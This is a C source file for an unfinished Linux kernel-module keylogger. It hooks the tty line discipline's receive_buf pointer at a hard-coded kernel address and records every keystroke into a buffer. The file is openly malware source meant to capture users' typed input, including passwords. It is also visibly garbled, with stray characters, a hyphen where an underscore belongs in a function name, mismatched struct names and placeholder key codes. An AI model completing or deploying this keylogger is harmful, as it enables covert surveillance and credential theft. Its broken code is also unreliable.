// Keylogger
// Note: Requires Ubuntu 10.04

// TODO
#define BACKSPACE_KEY 0
#define ENTER_KEY 0

// TODO: Create module init for LKM

// jtypedef struct {
// j	int counter;
// j} atomic_t;

// #include <sys/types.h>
#include <linux/types.h>
#include <linux/kref.h>
#include <linux/fs.h>
#include <linux/tty.h>

// So compiler doesn't complain about undeclared tty_struct
// Probably don't need?
struct tty_struct *gb_tty_struct;
struct file *gb_file;
struct ktermios *gb_ktermios;
struct poll_table_struct *gb_poll_table_struct;

#include <linux/tty_ldisc.h>

// Custom tty_ldisc_ops
struct tty_ldisc_ops *our_tty_ldisc_N_TTY;
// Point to original receive_buf
static void (*original_receive_buf) (struct tty_struct*, const unsigned char*, char*, int);

// For storing buffer
struct line_buff {
	char line[100000];
	int pos;
};

static struct line_buf key_buf;

static void log_keys(struct tty_struct *tty, const unsigned char *cp, char *fp, int count)
{
	// Check if there is nothing to log
	if (!tty->read_buf || tty->real_raw) {
		return;
	}

	// Log data in key buffer
	if (count == 1) {
		if (*cp == BACKSPACE_KEY) {
		key_buf.line[--key_buf.pos] = 0;
		} else if (*cp == ENTER_KEY) {
			key_buf.line[key_buf.pos++] = '\n';j
		} else {
			key_buf.line[key_buf.pos++] = *cp;
		}
	}

}

static void new_receive_buf(struct tty_struct *tty, const unsigned char *cp, char *fp, int count)
{
	log_keys(tty, cp, fp, count);
	original-receive_buf(tty, cp, fp, count);
}

static void hijack_tty_ldisc_receive_buf(void)
{
	our_tty_ldisc_N_TTY = (struct tty_ldisc_ops *) 0xc0787dc0;
	original_receive_buf = our_tty_ldisc_N_TTY->receive_buf;
	our_tty_ldisc_N_TTY->receive_buf = new_receive_buf;
}

static void unhijack_tty_ldisc_receive_buf(void)
{
	our_tty_ldisc_N_TTY->receive_buf = original_receive_buf;
}
